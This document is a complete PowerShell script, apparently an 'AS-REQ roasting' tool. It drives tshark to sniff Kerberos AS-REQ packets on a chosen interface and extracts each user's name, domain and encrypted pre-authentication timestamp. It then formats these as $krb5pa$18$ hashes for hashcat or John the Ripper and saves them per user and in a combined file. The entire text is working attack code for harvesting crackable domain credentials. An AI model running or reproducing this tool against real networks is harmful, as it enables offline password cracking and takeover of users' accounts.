param(
  [Parameter(Mandatory = $false)]
  [string]$Interface = "",

  [Parameter(Mandatory = $false)]
  [string]$OutputDir = ".\kerberos_captures",

  [Parameter(Mandatory = $false)]
  [ValidateSet("john", "hashcat")]
  [string]$Format = "hashcat",

  [Parameter(Mandatory = $false)]
  [switch]$NoFiles
)

$TsharkPath = "C:\Program Files\Wireshark\tshark.exe"

# Globals
$script:ShouldStop = $false
$script:TsharkProcess = $null

# Ensure output directory (only if writing files)
if (-not $NoFiles) {
  if (!(Test-Path -LiteralPath $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    Write-Host "[+] Created output directory: $OutputDir" -ForegroundColor Green
  }
}

# Graceful stop
function Stop-Listener {
  Write-Host "`n[!] Stopping listener..." -ForegroundColor Yellow
  $script:ShouldStop = $true

  if ($script:TsharkProcess -and !$script:TsharkProcess.HasExited) {
    try {
      $script:TsharkProcess.Kill()
      Write-Host "[+] Tshark process terminated" -ForegroundColor Green
    } catch {
      Write-Host "[!] Error stopping tshark: $($_.Exception.Message)" `
        -ForegroundColor Red
    }
  }

  if ($NoFiles) {
    Write-Host "[+] Listener stopped." -ForegroundColor Green
  } else {
    Write-Host "[+] Listener stopped. Check output files in: $OutputDir" `
      -ForegroundColor Green
  }
  exit 0
}

# Ctrl+C handler
try {
  [Console]::TreatControlCAsInput = $false
  [Console]::CancelKeyPress += {
    param($sender, $e)
    $e.Cancel = $true
    Stop-Listener
  }
} catch {
  # If console events aren't supported, user can close window or kill tshark
}

function Get-NetworkInterfaces {
  Write-Host "[*] Available network interfaces:" -ForegroundColor Yellow
  $interfaces = & $TsharkPath -D 2>$null
  foreach ($line in $interfaces) {
    Write-Host "    $line" -ForegroundColor Cyan
  }
  Write-Host ""
}

function Parse-AsReqData {
  param([string]$PacketData)

  if ($PacketData -and $PacketData.Trim() -ne "") {
    $parts = $PacketData.Split('$')
    if ($parts.Count -eq 3) {
      return @{
        Username  = $parts[0]
        Domain    = $parts[1]
        Cipher    = $parts[2]
        Timestamp = Get-Date
      }
    }
  }
  return $null
}

function Format-Hash {
  param($AsReqData, [string]$Format)

  if ($Format -eq "john") {
    return "`$krb5pa`$18`$$($AsReqData.Username)`$$($AsReqData.Domain)`$`$$($AsReqData.Cipher)"
  } else {
    return "`$krb5pa`$18`$$($AsReqData.Username)`$$($AsReqData.Domain)`$$($AsReqData.Cipher)"
  }
}

# Unified output function: writes to files unless -NoFiles is set
function Write-Outputs {
  param($AsReqData, [string]$Hash)

  $timestamp = $AsReqData.Timestamp.ToString("yyyy-MM-dd HH:mm:ss")

  # Console messages
  Write-Host "[+] $timestamp - Captured AS-REQ for " `
    -NoNewline -ForegroundColor Green
  Write-Host "$($AsReqData.Username)@$($AsReqData.Domain)" `
    -ForegroundColor Green

  # Print the hash on its own line
  Write-Output $Hash

  if ($NoFiles) {
    return
  }

  # Per-user file (just the hash per line)
  $userFile = Join-Path $OutputDir `
    "$($AsReqData.Username)_$($AsReqData.Domain).txt"
  Add-Content -Path $userFile -Value $Hash

  # All hashes file (just hashes)
  $hashesFile = Join-Path $OutputDir "all_hashes_$Format.txt"
  Add-Content -Path $hashesFile -Value $Hash
}

function Test-TsharkInterface {
  param([string]$Interface)

  Write-Host "[*] Testing interface connectivity..." -ForegroundColor Yellow
  try {
    # Fully quiet: no stdout/stderr, short duration
    & $TsharkPath `
      -Q `
      -i $Interface `
      -a duration:1 `
      -q 1>$null 2>$null

    if ($LASTEXITCODE -eq 0) {
      Write-Host "[+] Interface test successful" -ForegroundColor Green
      return $true
    } else {
      Write-Host "[!] Interface test failed" -ForegroundColor Red
      return $false
    }
  } catch {
    Write-Host "[!] Error testing interface: $($_.Exception.Message)" `
      -ForegroundColor Red
    return $false
  }
}

# File-based listener (single mode)
function Invoke-ASREQRoast {
  Write-Host "=== Kerberos AS-REQ Live Listener ===" `
    -ForegroundColor Magenta

  if ($NoFiles) {
    Write-Host "[*] No-file mode: hashes will only be printed to console" `
      -ForegroundColor Yellow
  } else {
    Write-Host "[*] Output directory: $OutputDir" -ForegroundColor Yellow
  }
  Write-Host "[*] Hash format: $Format" -ForegroundColor Yellow

  if ($Interface -eq "") {
    Get-NetworkInterfaces
    $Interface = Read-Host "Enter interface number or name"
  }

  Write-Host "[*] Starting capture on interface: $Interface" `
    -ForegroundColor Yellow

  if (!(Test-TsharkInterface -Interface $Interface)) {
    Write-Host "[!] Interface test failed. Continuing anyway..." `
      -ForegroundColor Yellow
  }

  Write-Host "[*] Listening for Kerberos AS-REQ packets... (Press Ctrl+C to stop)" `
    -ForegroundColor Green
  Write-Host ""

  $tempFile = Join-Path $env:TEMP ("tshark_output_{0}.txt" -f (Get-Random))
  $errFile = Join-Path $env:TEMP ("tshark_error_{0}.log" -f (Get-Random))

  try {
    $displayFilter = 'kerberos.msg_type == 10 && kerberos.CNameString && kerberos.realm && kerberos.cipher'

    # -Q quiet, -n no name resolution, -s 0 no snaplen truncation, -l line-buffered
    $argList =
      ('-Q -n -s 0 -i "{0}" -Y "{1}" -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher -E "separator=$" -l' `
        -f $Interface, $displayFilter)

    Write-Verbose "Starting tshark with args: $argList"
    $script:TsharkProcess = Start-Process -FilePath $TsharkPath `
      -ArgumentList $argList `
      -NoNewWindow -PassThru `
      -RedirectStandardOutput $tempFile `
      -RedirectStandardError $errFile

    Write-Host "[+] Tshark started (PID: $($script:TsharkProcess.Id))" `
      -ForegroundColor Green
    Write-Verbose "Writing output to: $tempFile"
    Write-Verbose "Stderr redirected to: $errFile"

    $lastSize = 0
    while (!$script:ShouldStop -and !$script:TsharkProcess.HasExited) {
      Start-Sleep -Milliseconds 400

      if (Test-Path -LiteralPath $tempFile) {
        $currentSize = (Get-Item -LiteralPath $tempFile).Length
        if ($currentSize -gt $lastSize) {
          $fs = [System.IO.File]::Open($tempFile, 'Open', 'Read', 'ReadWrite')
          try {
            $fs.Seek($lastSize, [System.IO.SeekOrigin]::Begin) | Out-Null
            $sr = New-Object System.IO.StreamReader($fs)
            $newContent = $sr.ReadToEnd()
            $sr.Close()
          } finally {
            $fs.Close()
          }

          $lastSize = $currentSize
          $lines = $newContent -split "`r?`n"
          foreach ($line in $lines) {
            if ($line.Trim()) {
              $asReqData = Parse-AsReqData -PacketData $line.Trim()
              if ($asReqData) {
                $hash = Format-Hash -AsReqData $asReqData -Format $Format
                Write-Outputs -AsReqData $asReqData -Hash $hash
              }
            }
          }
        }
      }
    }
  } catch {
    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
  } finally {
    if (Test-Path -LiteralPath $tempFile) {
      Remove-Item -LiteralPath $tempFile -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path -LiteralPath $errFile) {
      Remove-Item -LiteralPath $errFile -Force -ErrorAction SilentlyContinue
    }
  }
}

Write-Host ""
Write-Host "Press Ctrl+C to stop the listener at any time" -ForegroundColor Yellow
Write-Host ""

try {
  Invoke-ASREQRoast
} finally {
  Stop-Listener
}
